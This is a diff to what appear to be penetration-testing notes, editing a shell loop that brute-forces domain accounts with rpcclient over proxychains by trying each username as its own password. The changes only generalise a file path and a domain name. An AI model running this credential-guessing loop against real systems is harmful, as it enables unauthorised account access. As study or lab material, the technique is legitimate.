@@ -1977,9 +1977,9 @@ rpcclient $> queryuser 500
 
 Password bruteforce via rpcclient
 ```
-for u in `cat /anthem/Recon/users_sorted.txt`; do
+for u in `cat users_sorted.txt`; do
 echo -n "[*] user: $u" && \
-proxychains rpcclient -U "american\$u%$u" -c "getusername;quit" 10.9.8.40
+proxychains rpcclient -U "domain\$u%$u" -c "getusername;quit" 10.9.8.40
 done
 ```
 
